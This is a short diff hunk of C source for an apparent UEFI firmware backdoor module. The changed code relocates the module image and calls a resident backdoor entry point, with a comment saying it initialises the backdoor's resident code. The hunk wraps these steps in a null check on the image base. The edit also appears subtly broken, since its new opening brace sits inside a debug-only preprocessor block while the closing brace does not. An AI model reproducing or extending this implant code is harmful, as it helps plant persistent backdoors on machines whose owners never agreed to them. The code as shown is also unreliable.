@@ -223,25 +223,28 @@ _ModuleEntryPoint(
     DbgMsg(__FILE__, __LINE__, "                              \r\n");
     DbgMsg(__FILE__, __LINE__, "******************************\r\n");
 
-    DbgMsg(
-        __FILE__, __LINE__, "Image address is "FPTR"\r\n", 
-        m_ImageBase
-    );
+    if (m_ImageBase)
+    {
+        DbgMsg(
+            __FILE__, __LINE__, "Image address is "FPTR"\r\n", 
+            m_ImageBase
+        );
 
 #endif // BACKDOOR_DEBUG    
 
-    // copy image to the new location
-    if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
-    {
-        BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
-            Image,
-            (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
-        );
+        // copy image to the new location
+        if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
+        {
+            BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
+                Image,
+                (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
+            );
         
-        DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
+            DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
         
-        // initialize backdoor resident code
-        pEntry(Image);
+            // initialize backdoor resident code
+            pEntry(Image);
+        }
     } 
 
 #if defined(BACKDOOR_DEBUG)
